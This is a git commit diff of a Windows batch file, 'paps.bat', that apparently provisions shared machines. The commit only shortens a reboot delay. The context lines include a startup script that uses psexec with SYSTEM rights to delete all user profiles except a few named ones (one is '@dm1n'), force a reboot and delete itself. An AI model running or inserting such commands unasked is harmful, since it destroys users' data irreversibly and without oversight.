fff537ad1bd32bbc2cdf9964399b32832c185e9a
shansnow89 <norshanlee89@gmail.com>
2026-06-25 08:28:45 +0800

    Update paps.bat

--- paps.bat
+++ paps.bat
@@ -10,7 +10,7 @@ echo powershell -c "Get-LocalGroupMember -Group 'Administrators' | Where-Object 
 echo psexec -accepteula -s -i powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory | Where-Object {$exclude -notcontains $_.Name} | ForEach-Object {$p=$_.FullName; (Get-WmiObject Win32_UserProfile | Where-Object {$_.LocalPath -eq $p}) | ForEach-Object {$_.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2>$null; tzutil /s 'Singapore Standard Time'; shutdown -r -t 5; Start-Sleep -Seconds 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
 echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
 echo del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat" /f /q ^>nul 2^>^&1
-echo shutdown -r -t 30 ^>nul 2^>^&1
+echo shutdown -r -t 20 ^>nul 2^>^&1
 ) > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\user.bat"
 :: ============================================================
 :: Office.bat
